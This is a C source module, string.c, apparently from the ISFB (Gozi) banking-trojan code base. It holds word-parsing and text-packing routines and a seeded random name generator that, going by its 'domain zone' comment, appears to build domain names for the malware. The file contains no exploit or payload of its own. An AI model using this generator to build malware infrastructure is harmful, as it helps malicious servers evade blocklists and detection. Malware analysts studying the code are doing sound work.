//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: string.c
// $Revision: 352 $
// $Date: 2014-09-24 20:47:14 +0400 (Ср, 24 сен 2014) $
// description:
//	Strings manipulation routines. Text parsing, random string generation and so on. 


#define		MIN_WORDS_ALLOC		0x1000

#include "main.h"
#include "memalloc.h"
#include "lsasup.h"



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Parses a 0-terminated string into words.
//	Returns number of words found and a pointer to an array of pointers to every word.
//
ULONG	StringParseText(
					IN	LPTSTR		Text,			//	0-terminated string of words
					IN	ULONG		NumberWords,	//	number of words to parse
					IN	ULONG		MinWordLen,		//	minimum word len (to skip short words)	
					OUT	LPTSTR**	pWords			//	array of pointers to words
					)
{
	ULONG	wSize = MIN_WORDS_ALLOC, cSize = 0, Count = 0, Index = 0;
	LPTSTR	wStr = NULL, cStr = Text;
	LPTSTR*	Words;

	if (NumberWords == 0)
		NumberWords = INT_MAX;

	if (Words = (LPTSTR*)AppAlloc(wSize * sizeof(LPTSTR*)))
	{
		while(cStr[0] != 0)
		{
			if (cStr[0] < 0x41 || (cStr[0] > 0x5a && cStr[0] < 0x61) || cStr[0] > 0x7a)
			{
				if (wStr)
				{					
					if (cSize >= MinWordLen)
					{
						cStr[0] = 0;
						Words[Index] = wStr;
						Count += 1;
						Index += 1;
						if (Index == wSize)
						{	
							wSize += MIN_WORDS_ALLOC;
							if (!(Words = AppRealloc(Words, (wSize * sizeof(LPTSTR*)))))
								break;
						}
					}	// if (cSize >= MinWordLen)
					wStr = NULL;
					cSize = 0;
				}	// if (wStr)
				cStr += 1;
				continue;
			}

			ASSERT(cStr[0] != 0);

			if (cStr[0] >= 0x41 && cStr[0] <= 0x5a)
				cStr[0] += 0x20;
				
			if (!wStr)
			{
				wStr = cStr;
				ASSERT(cSize == 0);
			}
			cSize += 1;
			cStr += 1;
			
		}	// while(cStr[0] != 0);

	}	// if (Words)

	
	if (Words)
		*pWords = Words;
	else
		Count = 0;

	return(Count);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Packs the specified string of words.
//
ULONG	StringPackText(
			   LPTSTR	Text,	//	0-terminated string of words
			   ULONG	MaxWords,
			   ULONG	MinWordLen
			   )
{
	LPTSTR*	Words;
	ULONG	i, NumberWords = StringParseText(Text, MaxWords, MinWordLen, &Words);

	if (NumberWords)
	{
		lstrcpy(Text, Words[0]);
		lstrcat(Text, szSpace);

		for (i=1; i<NumberWords; i++)
		{
			lstrcat(Text, Words[i]);
			lstrcat(Text, szSpace);
		}
	}	// if (NumberWords)

	return((lstrlen(Text) + 1)*sizeof(_TCHAR));
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates a name string of specified size using random selected words from specified words array.
//
LPTSTR	StringNameFromWords(
					IN	PULONG	pSeed,			// random seed
					IN	LPTSTR*	Words,			// array of pointers to words
					IN	ULONG	NumberWords,	// number of pointers in the array
					IN	ULONG	MinLen,		// minimum string length
					IN	ULONG	MaxLen		// maximum string length
					)
{
	LPTSTR	Word, Name = NULL;
	ULONG	cLen, wSize, cSize = 0;

	if (MaxLen > MinLen)
		cLen = (LsaRandom(pSeed)%(MaxLen - MinLen)) + MinLen;
	else
		cLen = MinLen;

	if (Name = AppAlloc((MaxLen + 1 + 4)*sizeof(_TCHAR)))	// +4 is for domain zone 
	{
		while(cSize < cLen)
		{
			Word = Words[LsaRandom(pSeed)%NumberWords];
			wSize = _tcslen(Word);

			if ((LsaRandom(pSeed)%3) == 0)
				wSize /= 2;

			if ((cSize + wSize) > MaxLen)
				continue;
			
			memcpy((PCHAR)Name + cSize, (PCHAR)Word, wSize * sizeof(_TCHAR));
			cSize += wSize;
		}

		Name[cSize] = 0;
	}
	return(Name);
}
